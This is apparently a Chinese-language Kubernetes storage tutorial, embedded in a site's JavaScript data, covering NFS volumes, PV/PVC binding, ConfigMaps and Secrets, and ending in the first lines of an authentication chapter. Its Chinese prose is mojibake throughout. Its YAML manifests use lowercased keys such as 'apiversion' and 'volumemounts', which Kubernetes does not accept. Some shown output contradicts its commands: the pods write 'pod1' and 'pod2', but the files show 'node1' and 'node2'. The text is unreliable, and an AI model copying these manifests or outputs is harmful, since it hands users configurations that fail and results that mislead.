çæå¡å¨ï¼è¿éä¸ºäºç®åï¼ç´æ¥æ¯ master èç¹å nfs æå¡å¨\n\n# å¨nfsä¸å®è£nfsæå¡\n[root@nfs ~]# yum install nfs-utils -y\n\n# åå¤ä¸ä¸ªå±äº«ç®å½\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# å°å±äº«ç®å½ä»¥è¯»åæéæ´é²ç»192.168.5.0/24ç½æ®µä¸­çææä¸»æº\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# å¯å¨nfsæå¡\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2ï¼æ¥ä¸æ¥ï¼è¦å¨çæ¯ä¸ª node èç¹ä¸é½å®è£ä¸ nfsï¼è¿æ ·çç®çæ¯ä¸ºäº node èç¹å¯ä»¥é©±å¨ nfs è®¾å¤\n\n# å¨nodeä¸å®è£nfsæå¡ï¼æ³¨æä¸éè¦å¯å¨\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3ï¼æ¥ä¸æ¥ï¼å°±å¯ä»¥ç¼å pod çéç½®æä»¶äºï¼åå»º volume-nfs.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfsæå¡å¨å°å\n      path: /root/data/nfs #å±äº«æä»¶è·¯å¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4ï¼æåï¼è¿è¡ä¸ podï¼è§å¯ç»æ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nname                  ready   status    restarts   age\nvolume-nfs        2/2     running   0          2m9s\n\n# æ¥çnfsæå¡å¨ä¸çå±äº«ç®å½ï¼åç°å·²ç»ææä»¶äº\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# é«çº§å­å¨\n\nåé¢å·²ç»å­¦ä¹ äºä½¿ç¨ nfs æä¾å­å¨ï¼æ­¤æ¶å°±è¦æ±ç¨æ·ä¼æ­å»º nfs ç³»ç»ï¼å¹¶ä¸ä¼å¨ yaml éç½® nfsãç±äº kubernetes æ¯æçå­å¨ç³»ç»æå¾å¤ï¼è¦æ±å®¢æ·å¨é½ææ¡ï¼æ¾ç¶ä¸ç°å®ãä¸ºäºè½å¤å±è½åºå±å­å¨å®ç°çç»èï¼æ¹ä¾¿ç¨æ·ä½¿ç¨ï¼ kubernetes å¼å¥ pv å pvc ä¸¤ç§èµæºå¯¹è±¡ã\n\npvï¼persistent volumeï¼æ¯æä¹åå·çææï¼æ¯å¯¹åºå±çå±äº«å­å¨çä¸ç§æ½è±¡ãä¸è¬æåµä¸ pv ç± kubernetes ç®¡çåè¿è¡åå»ºåéç½®ï¼å®ä¸åºå±å·ä½çå±äº«å­å¨ææ¯æå³ï¼å¹¶éè¿æä»¶å®æä¸å±äº«å­å¨çå¯¹æ¥ã\n\npvcï¼persistent volume claimï¼æ¯æä¹å·å£°æçææï¼æ¯ç¨æ·å¯¹äºå­å¨éæ±çä¸ç§å£°æãæ¢å¥è¯è¯´ï¼pvc å¶å®å°±æ¯ç¨æ·å kubernetes ç³»ç»ååºçä¸ç§èµæºéæ±ç³è¯·ã\n\n\n\nä½¿ç¨äº pv å pvc ä¹åï¼å·¥ä½å¯ä»¥å¾å°è¿ä¸æ­¥çç»åï¼\n\n * å­å¨ï¼å­å¨å·¥ç¨å¸ç»´æ¤\n * pvï¼ kubernetes ç®¡çåç»´æ¤\n * pvcï¼kubernetes ç¨æ·ç»´æ¤\n\n\n# pv\n\npv æ¯å­å¨èµæºçæ½è±¡ï¼ä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiversion: v1  \nkind: persistentvolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # å­å¨ç±»åï¼ä¸åºå±çæ­£å­å¨å¯¹åº\n  capacity:  # å­å¨è½åï¼ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½®\n    storage: 2gi\n  accessmodes:  # è®¿é®æ¨¡å¼\n  storageclassname: # å­å¨ç±»å«\n  persistentvolumereclaimpolicy: # åæ¶ç­ç¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npv çå³é®éç½®åæ°è¯´æï¼\n\n * å­å¨ç±»å\n   åºå±å®éå­å¨çç±»åï¼kubernetes æ¯æå¤ç§å­å¨ç±»åï¼æ¯ç§å­å¨ç±»åçéç½®é½ææå·®å¼\n * å­å¨è½åï¼capacityï¼\n   ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½® (storage=1gi)ï¼ä¸è¿æªæ¥å¯è½ä¼å å¥ iopsãååéç­ææ çéç½®\n * è®¿é®æ¨¡å¼ï¼accessmodesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æéï¼è®¿é®æéåæ¬ä¸é¢å ç§æ¹å¼ï¼\n   * readwriteonceï¼rwoï¼ï¼è¯»åæéï¼ä½æ¯åªè½è¢«åä¸ªèç¹æè½½ (æçæ¯ pv ä¸ pvc ç»å®åªè½ä¸ä¸ª)\n   * readonlymanyï¼roxï¼ï¼ åªè¯»æéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n   * readwritemanyï¼rwxï¼ï¼è¯»åæéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçè®¿é®æ¨¡å¼ä¸å\n * åæ¶ç­ç¥ï¼persistentvolumereclaimpolicyï¼\n   å½ pv ä¸åè¢«ä½¿ç¨äºä¹åï¼å¯¹å¶çå¤çæ¹å¼ãç®åæ¯æä¸ç§ç­ç¥ï¼\n   * retain ï¼ä¿çï¼ ä¿çæ°æ®ï¼éè¦ç®¡çåæå·¥æ¸çæ°æ®\n   * recycleï¼åæ¶ï¼ æ¸é¤ pv ä¸­çæ°æ®ï¼ææç¸å½äºæ§è¡ rm -rf /thevolume/*\n   * delete ï¼å é¤ï¼ ä¸ pv ç¸è¿çåç«¯å­å¨å®æ volume çå é¤æä½ï¼å½ç¶è¿å¸¸è§äºäºæå¡åçå­å¨æå¡\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçåæ¶ç­ç¥ä¸å\n * å­å¨ç±»å«\n   pv å¯ä»¥éè¿ storageclassname åæ°æå®ä¸ä¸ªå­å¨ç±»å«\n   * å·æç¹å®ç±»å«ç pv åªè½ä¸è¯·æ±äºè¯¥ç±»å«ç pvc è¿è¡ç»å®\n   * æªè®¾å®ç±»å«ç pv ååªè½ä¸ä¸è¯·æ±ä»»ä½ç±»å«ç pvc è¿è¡ç»å®\n * ç¶æï¼statusï¼\n   ä¸ä¸ª pv ççå½å¨æä¸­ï¼å¯è½ä¼å¤äº 4 ä¸­ä¸åçé¶æ®µï¼\n   * availableï¼å¯ç¨ï¼ï¼ è¡¨ç¤ºå¯ç¨ç¶æï¼è¿æªè¢«ä»»ä½ pvc ç»å®\n   * boundï¼å·²ç»å®ï¼ï¼ è¡¨ç¤º pv å·²ç»è¢« pvc ç»å®\n   * releasedï¼å·²éæ¾ï¼ï¼ è¡¨ç¤º pvc è¢«å é¤ï¼ä½æ¯èµæºè¿æªè¢«éç¾¤éæ°å£°æ\n   * failedï¼å¤±è´¥ï¼ï¼ è¡¨ç¤ºè¯¥ pv çèªå¨åæ¶å¤±è´¥\n\nå®éª\nä½¿ç¨ nfs ä½ä¸ºå­å¨ï¼æ¥æ¼ç¤º pv çä½¿ç¨ï¼åå»º 3 ä¸ª pvï¼å¯¹åº nfs ä¸­ç 3 ä¸ªæ´é²çè·¯å¾ã\n1. åå¤ nfs ç¯å¢\n\n# åå»ºç®å½\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# æ´é²æå¡\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# éå¯æå¡\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. åå»º pv.yaml\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# åå»º pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname   capacity   access modes  reclaim policy  status      age   volumemode\npv1    1gi        rwx            retain        available    10s   filesystem\npv2    2gi        rwx            retain        available    10s   filesystem\npv3    3gi        rwx            retain        available    9s    filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# pvc\n\npvc æ¯èµæºçç³è¯·ï¼ç¨æ¥å£°æå¯¹å­å¨ç©ºé´ãè®¿é®æ¨¡å¼ãå­å¨ç±»å«éæ±ä¿¡æ¯ãä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessmodes: # è®¿é®æ¨¡å¼\n  selector: # éç¨æ ç­¾å¯¹pvéæ©\n  storageclassname: # å­å¨ç±»å«\n  resources: # è¯·æ±ç©ºé´\n    requests:\n      storage: 5gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\npvc çå³é®éç½®åæ°è¯´æï¼\n\n * è®¿é®æ¨¡å¼ï¼accessmodesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æé\n * éæ©æ¡ä»¶ï¼selectorï¼\n   éè¿ label selector çè®¾ç½®ï¼å¯ä½¿ pvc å¯¹äºç³»ç»ä¸­å·±å­å¨ç pv è¿è¡ç­é\n * å­å¨ç±»å«ï¼storageclassnameï¼\n   pvc å¨å®ä¹æ¶å¯ä»¥è®¾å®éè¦çåç«¯å­å¨çç±»å«ï¼åªæè®¾ç½®äºè¯¥ class ç pv æè½è¢«ç³»ç»éåº\n * èµæºè¯·æ±ï¼resources ï¼\n   æè¿°å¯¹å­å¨èµæºçè¯·æ±\n\nå®éª\n1. åå»º pvc.yamlï¼ç³è¯· pv\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# åå»ºpvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nname   status   volume   capacity   access modes   storageclass   age   volumemode\npvc1   bound    pv1      1gi        rwx                           15s   filesystem\npvc2   bound    pv2      2gi        rwx                           15s   filesystem\npvc3   bound    pv3      3gi        rwx                           15s   filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname  capacity access modes  reclaim policy  status    claim       age     volumemode\npv1    1gi        rwx        retain          bound    dev/pvc1    3h37m    filesystem\npv2    2gi        rwx        retain          bound    dev/pvc2    3h37m    filesystem\npv3    3gi        rwx        retain          bound    dev/pvc3    3h37m    filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. åå»º pods.yaml, ä½¿ç¨ pv\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc1\n        readonly: false\n---\napiversion: v1\nkind: pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc2\n        readonly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname   ready   status    restarts   age   ip            node   \npod1   1/1     running   0          14s   10.244.1.69   node1   \npod2   1/1     running   0          14s   10.244.1.70   node1  \n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nname   status   volume   capacity   access modes      age   volumemode\npvc1   bound    pv1      1gi        rwx               94m   filesystem\npvc2   bound    pv2      2gi        rwx               94m   filesystem\npvc3   bound    pv3      3gi        rwx               94m   filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nname   capacity   access modes   reclaim policy   status   claim       age     volumemode\npv1    1gi        rwx            retain           bound    dev/pvc1    5h11m   filesystem\npv2    2gi        rwx            retain           bound    dev/pvc2    5h11m   filesystem\npv3    3gi        rwx            retain           bound    dev/pvc3    5h11m   filesystem\n\n# æ¥çnfsä¸­çæä»¶å­å¨\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# çå½å¨æ\n\npvc å pv æ¯ä¸ä¸å¯¹åºçï¼pv å pvc ä¹é´çç¸äºä½ç¨éµå¾ªä»¥ä¸çå½å¨æï¼\n\n * èµæºä¾åºï¼ç®¡çåæå¨åå»ºåºå±å­å¨å pv\n * èµæºç»å®ï¼ç¨æ·åå»º pvcï¼kubernetes è´è´£æ ¹æ® pvc çå£°æå»å¯»æ¾ pvï¼å¹¶ç»å®\n   å¨ç¨æ·å®ä¹å¥½ pvc ä¹åï¼ç³»ç»å°æ ¹æ® pvc å¯¹å­å¨èµæºçè¯·æ±å¨å·²å­å¨ç pv ä¸­éæ©ä¸ä¸ªæ»¡è¶³æ¡ä»¶ç\n   * ä¸æ¦æ¾å°ï¼å°±å°è¯¥ pv ä¸ç¨æ·å®ä¹ç pvc è¿è¡ç»å®ï¼ç¨æ·çåºç¨å°±å¯ä»¥ä½¿ç¨è¿ä¸ª pvc äº\n   * å¦ææ¾ä¸å°ï¼pvc åä¼æ éæå¤äº pending ç¶æï¼ç´å°ç­å°ç³»ç»ç®¡çååå»ºäºä¸ä¸ªç¬¦åå¶è¦æ±ç pv\n     pvä¸æ¦ç»å®å°æä¸ªpvcä¸ï¼å°±ä¼è¢«è¿ä¸ªpvcç¬å ï¼ä¸è½åä¸å¶ä»pvcè¿è¡ç»å®äº\n * èµæºä½¿ç¨ï¼ç¨æ·å¯å¨ pod ä¸­å volume ä¸æ ·ä½¿ç¨ pvc\n   pod ä½¿ç¨ volume çå®ä¹ï¼å° pvc æè½½å°å®¹å¨åçæä¸ªè·¯å¾è¿è¡ä½¿ç¨ã\n * èµæºéæ¾ï¼ç¨æ·å é¤ pvc æ¥éæ¾ pv\n   å½å­å¨èµæºä½¿ç¨å®æ¯åï¼ç¨æ·å¯ä»¥å é¤ pvcï¼ä¸è¯¥ pvc ç»å®ç pv å°ä¼è¢«æ è®°ä¸º âå·²éæ¾âï¼ä½è¿ä¸è½ç«å»ä¸å¶ä» pvc è¿è¡ç»å®ãéè¿ä¹å pvc åå¥çæ°æ®å¯è½è¿è¢«çå¨å­å¨è®¾å¤ä¸ï¼åªæå¨æ¸é¤ä¹åè¯¥ pv æè½åæ¬¡ä½¿ç¨ã\n * èµæºåæ¶ï¼kubernetes æ ¹æ® pv è®¾ç½®çåæ¶ç­ç¥è¿è¡èµæºçåæ¶\n   å¯¹äº pvï¼ç®¡çåå¯ä»¥è®¾å®åæ¶ç­ç¥ï¼ç¨äºè®¾ç½®ä¸ä¹ç»å®ç pvc éæ¾èµæºä¹åå¦ä½å¤çéçæ°æ®çé®é¢ãåªæ pv çå­å¨ç©ºé´å®æåæ¶ï¼æè½ä¾æ°ç pvc ç»å®åä½¿ç¨\n\n\n\n\n# éç½®å­å¨\n\n\n# configmap\n\nconfigmap æ¯ä¸ç§æ¯è¾ç¹æ®çå­å¨å·ï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å­å¨éç½®ä¿¡æ¯çã\n\nåå»º configmap.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: configmap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä½¿ç¨æ­¤éç½®æä»¶åå»º configmap\n\n# åå»ºconfigmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# æ¥çconfigmapè¯¦æ\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nname:         configmap\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\n\ndata\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nevents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ¥ä¸æ¥åå»ºä¸ä¸ª pod-configmap.yamlï¼å°ä¸é¢åå»ºç configmap æè½½è¿å»\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # å°configmapæè½½å°ç®å½\n    - name: config\n      mountpath: /configmap/config\n  volumes: # å¼ç¨configmap\n  - name: config\n    configmap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nname            ready   status    restarts   age\npod-configmap   1/1     running   0          6s\n\n#è¿å¥å®¹å¨\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# å¯ä»¥çå°æ å°å·²ç»æåï¼æ¯ä¸ªconfigmapé½æ å°æäºä¸ä¸ªç®å½\n# key---\x3eæä»¶     value----\x3eæä»¶ä¸­çåå®¹\n# æ­¤æ¶å¦ææ´æ°configmapçåå®¹, å®¹å¨ä¸­çå¼ä¹ä¼å¨ææ´æ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# secret\n\nå¨ kubernetes ä¸­ï¼è¿å­å¨ä¸ç§å configmap éå¸¸ç±»ä¼¼çå¯¹è±¡ï¼ç§°ä¸º secret å¯¹è±¡ãå®ä¸»è¦ç¨äºå­å¨ææä¿¡æ¯ï¼ä¾å¦å¯ç ãç§é¥ãè¯ä¹¦ç­ç­ã\n\n1. é¦åä½¿ç¨ base64 å¯¹æ°æ®è¿è¡ç¼ç \n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #åå¤username\nywrtaw4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #åå¤password\nmtizndu2\n\n\n1\n2\n3\n4\n\n\n2. æ¥ä¸æ¥ç¼å secret.yamlï¼å¹¶åå»º secret\n\napiversion: v1\nkind: secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: opaque\ndata:\n  username: ywrtaw4=\n  password: mtizndu2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# åå»ºsecret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# æ¥çsecretè¯¦æ\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nname:         secret\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\ntype:  opaque\ndata\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. åå»º pod-secret.yamlï¼å°ä¸é¢åå»ºç secret æè½½è¿å»ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # å°secretæè½½å°ç®å½\n    - name: config\n      mountpath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretname: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nname            ready   status    restarts   age\npod-secret      1/1     running   0          2m28s\n\n# è¿å¥å®¹å¨ï¼æ¥çsecretä¿¡æ¯ï¼åç°å·²ç»èªå¨è§£ç äº\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè³æ­¤ï¼å·²ç»å®ç°äºå©ç¨ secret å®ç°äºä¿¡æ¯çç¼ç ã',charsets:{cjk:!0}},{title:"kubernetes(åäº) å®å¨è®¤è¯",frontmatter:{title:"kubernetes(åäº) å®å¨è®¤è¯",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/611",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/611.kubernetes(%E5%8D%81%E4%BA%8C)%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81.html",relativePath:"01.è¿ç»´/60.Kubernetes/611.kubernetes(åäº) å®å¨è®¤è¯.md",key:"v-6634edc1",path:"/kubernetes/611/",headers:[{level:2,title:"è®¿é®æ§å¶æ¦è¿°",slug:"è®¿é®æ§å¶æ¦è¿°",normalizedTitle:"è®¿é®æ§å¶æ¦è¿°",charIndex:2},{level:2,title:"è®¤è¯ç®¡ç",slug:"è®¤è¯ç®¡ç",normalizedTitle:"è®¤è¯ç®¡ç",charIndex:467},{level:2,title:"ææç®¡ç",slug:"ææç®¡ç",normalizedTitle:"ææç®¡ç",charIndex:1201},{level:2,title:"åå¥æ§å¶",slug:"åå¥æ§å¶",normalizedTitle:"åå¥æ§å¶",charIndex:262}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"è®¿é®æ§å¶æ¦è¿° è®¤è¯ç®¡ç ææç®¡ç åå¥æ§å¶",content:'# è®¿é®æ§å¶æ¦è¿°\n\nKubernetes ä½ä¸ºä¸ä¸ªåå¸å¼éç¾¤çç®¡çå·¥å·ï¼ä¿è¯éç¾¤çå®å¨æ§æ¯å¶ä¸ä¸ªéè¦çä»»å¡ãæè°çå®å¨æ§å¶å®å°±æ¯ä¿è¯å¯¹ Kubernetes çåç§å®¢æ·ç«¯è¿è¡è®¤è¯åé´ææä½ã\n\nå®¢æ·ç«¯\nå¨ Kubernetes éç¾¤ä¸­ï¼å®¢æ·ç«¯éå¸¸æä¸¤ç±»ï¼\n\n * User Accountï¼ä¸è¬æ¯ç¬ç«äº kubernetes ä¹å¤çå¶ä»æå¡ç®¡ççç¨æ·è´¦å·ã\n * Service Accountï¼kubernetes ç®¡ççè´¦å·ï¼ç¨äºä¸º Pod ä¸­çæå¡è¿ç¨å¨è®¿é® Kubernetes æ¶æä¾èº«ä»½æ è¯ã\n\n\n\nè®¤è¯ãææä¸åå¥æ§å¶\nApiServer æ¯è®¿é®åç®¡çèµæºå¯¹è±¡çå¯ä¸å¥å£ãä»»ä½ä¸ä¸ªè¯·æ±è®¿é® ApiServerï¼é½è¦ç»è¿ä¸é¢ä¸ä¸ªæµç¨ï¼\n\n * Authenticationï¼è®¤è¯ï¼ï¼èº«ä»½é´å«ï¼åªææ­£ç¡®çè´¦å·æè½å¤éè¿è®¤è¯\n * Authorizationï¼ææï¼ï¼ å¤æ­ç¨æ·æ¯å¦ææéå¯¹è®¿é®çèµæºæ§è¡ç¹å®çå¨ä½\n * Admission Controlï¼åå¥æ§å¶ï¼ï¼ç¨äºè¡¥åæææºå¶ä»¥å®ç°æ´å ç²¾ç»çè®¿é®æ§å¶åè½ã\n\n\n# è®¤è¯ç®¡ç\n\nKubernetes éç¾¤å®å¨çæå³é®ç¹å¨äºå¦ä½è¯å«å¹¶è®¤è¯å®¢æ·ç«¯èº«ä»½ï¼å®æä¾äº 3 ç§å®¢æ·ç«¯èº«ä»½è®¤è¯æ¹å¼ï¼\n\n * HTTP Base è®¤è¯ï¼éè¿ç¨æ·å + å¯ç çæ¹å¼è®¤è¯\n\n> è¿ç§è®¤è¯æ¹å¼æ¯æ âç¨æ·åï¼å¯ç â ç¨ BASE64 ç®æ³è¿è¡ç¼ç åçå­ç¬¦ä¸²æ¾å¨ HTTP è¯·æ±ä¸­ç Header Authorization åéåéç»æå¡ç«¯ãæå¡ç«¯æ¶å°åè¿è¡è§£ç ï¼è·åç¨æ·ååå¯ç ï¼ç¶åè¿è¡ç¨æ·èº«ä»½è®¤è¯çè¿ç¨ã\n\n * HTTPS è¯ä¹¦è®¤è¯ï¼åºäº CA æ ¹è¯ä¹¦ç­¾åçååæ°å­è¯ä¹¦è®¤è¯æ¹å¼\n\n> è¿ç§è®¤è¯æ¹å¼æ¯å®å¨æ§æé«çä¸ç§æ¹å¼ï¼ä½æ¯åæ¶ä¹æ¯æä½èµ·æ¥æéº»ç¦çä¸ç§æ¹å¼ã\n\n\n\nHTTPS è®¤è¯å¤§ä½åä¸º 3 ä¸ªè¿ç¨ï¼\n1. è¯ä¹¦ç³è¯·åä¸å\n\n> HTTPS éä¿¡åæ¹çæå¡å¨å CA æºæç³è¯·è¯ä¹¦ï¼CA æºæä¸åæ ¹è¯ä¹¦ãæå¡ç«¯è¯ä¹¦åç§é¥ç»ç³è¯·è\n\n2. å®¢æ·ç«¯åæå¡ç«¯çååè®¤è¯\n\n> 1> å®¢æ·ç«¯åæå¡å¨ç«¯åèµ·è¯·æ±ï¼æå¡ç«¯ä¸åèªå·±çè¯ä¹¦ç»å®¢æ·ç«¯ï¼\n> 